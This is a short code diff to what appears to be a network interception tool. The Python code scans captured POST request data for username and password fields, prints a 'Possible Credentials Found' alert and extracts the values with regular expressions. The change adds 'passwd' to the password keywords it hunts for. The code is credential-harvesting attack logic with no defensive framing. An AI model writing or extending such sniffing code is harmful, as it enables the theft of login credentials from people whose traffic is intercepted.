@@ -80,7 +80,7 @@ class Device:
                     if "POST" in raw_data:
                         # Form field recognition for credentials
                         if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email', 'user_id', 'pseudonym', 'phone']) and \
-                           any(k in raw_data.lower() for k in ['password', 'pass', 'pwd', 'heslo']):
+                           any(k in raw_data.lower() for k in ['password', 'pass', 'pwd', 'heslo', 'passwd']):
                             print(f"{Fore.GREEN}[!] Possible Credentials Found:{Style.RESET_ALL}")
                             # Find login information
                             login_data = None
@@ -92,7 +92,7 @@ class Device:
                                         break
                             # Find password information
                             password_data = None
-                            for field in ['password', 'pass', 'pwd', 'heslo']:
+                            for field in ['password', 'pass', 'pwd', 'heslo', 'passwd']:
                                 if field in raw_data.lower():
                                     password_data = re.search(rf'{field}=[^&]*', raw_data)
                                     if password_data:
